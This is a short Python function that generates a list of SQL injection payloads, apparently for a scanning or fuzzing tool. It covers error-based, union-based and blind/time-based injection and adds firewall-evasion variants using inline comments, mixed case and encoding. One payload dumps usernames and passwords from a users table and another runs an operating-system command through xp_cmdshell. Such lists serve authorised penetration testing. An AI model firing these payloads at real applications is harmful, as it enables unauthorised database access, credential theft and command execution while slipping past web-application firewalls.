def generate_payloads():
    payloads = []

    # === Error-Based SQLi ===
    payloads += [
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' OR 1=1--",
        "' OR '1'='1' --",
        "' AND updatexml(1,concat(0x7e,user()),1)--",
    ]

    # === Union-Based SQLi ===
    payloads += [
        "' UNION SELECT NULL--",
        "' UNION SELECT username, password FROM users--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
    ]

    # === Blind SQLi ===
    payloads += [
        "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
        "' AND SLEEP(5)--",
        "' OR 1=1#",
        "' AND 1=1 AND 'a'='a",
    ]

    # === WAF Evasion Techniques ===

    ## Using inline SQL comments
    payloads += [
        "'/*!OR*/1=1--",
        "'/**/OR/**/1=1--",
        "'+OR+1=1--",
    ]

    ## Case variation
    payloads += [
        "' oR 1=1--",
        "' UnIoN sElEcT 1,2--",
    ]

    ## Using special characters
    payloads += [
        "'; EXEC xp_cmdshell('whoami')--",
        "'; WAITFOR DELAY '0:0:5'--",
    ]

    ## Using encoded input (ready for encoder module)
    payloads += [
        "'%20OR%201=1--",
        "'%09OR%091=1--",  # tab characters
    ]

    return list(set(payloads))  # remove duplicates